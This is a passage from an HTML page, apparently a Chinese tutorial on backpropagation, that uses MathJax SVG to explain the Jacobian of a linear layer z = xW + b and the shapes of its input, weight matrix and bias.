318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span>\n对所有输入变量 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.666ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.141ex\" height=\"1.666ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 946.3 736.2\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g></svg></mjx-container></span> 的偏导，表示的是\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.733ex\" height=\"2.009ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 1650 888\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"2207\" d=\"M46 676Q46 679 51 683H781Q786 679 786 676Q786 674 617 326T444 -26Q439 -33 416 -33T388 -26Q385 -22 216 326T46 676ZM697 596Q697 597 445 597T193 596Q195 591 319 336T445 80L697 596Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(833,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span>。</p>\n<p>以一个具体例子为例： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.471ex\" height=\"1.756ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 5070 776\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(742.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1798.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2370.6,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3640.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4641,0)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></svg></mjx-container></span> <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.817ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.816ex\" height=\"2.852ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -899.6 1244.7 1260.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(257.8,394) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"1004.7\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 就是 z 对 x 的雅可比矩阵。</p>\n<p>我们先设定具体形状：</p>\n<ul>\n<li><p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.09ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.251ex\" height=\"2.004ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -846 4088.7 886\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(849.8,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(1794.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1278,0)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g></g></g></g></svg></mjx-container></span>：输入是<strong>一个样本的特征行向量</strong></p></li>\n<li><p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.09ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.209ex\" height=\"2.004ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -846 4954.3 886\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1325.8,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(2270.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1606,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></svg></mjx-container></span>：权重矩阵（D 输入维度，M 输出维度）</p></li>\n<li><p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.09ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.284ex\" height=\"2.004ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -846 4103.4 886\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(706.8,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(1651.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1278,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></svg></mjx-container></span>：偏置（广播加法）</p></li>\n<li><p>那么：</p>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" 